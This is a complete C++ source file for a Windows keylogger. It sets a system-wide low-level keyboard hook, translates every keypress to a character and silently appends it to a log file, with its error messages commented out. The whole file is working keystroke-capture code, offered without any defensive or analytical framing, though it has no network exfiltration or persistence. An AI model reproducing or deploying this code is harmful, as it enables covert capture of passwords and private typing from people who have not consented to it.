// Author: Nemuel Wainaina

#include <fstream>
#include <windows.h>

HHOOK kbdHook;
HKL kbdLayout;
std::ofstream logFile;

LRESULT __stdcall processKey(int nCode, WPARAM wParam, LPARAM lParam) {
    if(nCode >= 0) {
        PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
        if(wParam == WM_KEYDOWN && nCode == HC_ACTION) {
            GetKeyState(VK_SHIFT);
            BYTE kbdState[256];
            GetKeyboardState(kbdState);
            USHORT translatedChar[2];

            if(ToAsciiEx(key->vkCode, key->scanCode, kbdState, translatedChar, key->flags, kbdLayout) == 1) {
                char key = translatedChar[0];
                logFile << key;
            }
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(int argc, char* argv[]) {
    if(argc != 2) {
        // std::cerr << "Usage: " << argv[0] << " PATH_TO_LOG_FILE" << std::endl;
        return 1;
    }

    logFile.open(argv[1], std::ios::app);
    if(!logFile.is_open()) {
        // std::cerr << "Error opening file" << std::endl;
        return 1;
    }

    kbdHook = SetWindowsHookExW(WH_KEYBOARD_LL, processKey, NULL, 0);
    kbdLayout = GetKeyboardLayout(0);

    MSG msg;
    while(GetMessageW(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(kbdHook);
    logFile.close();
}
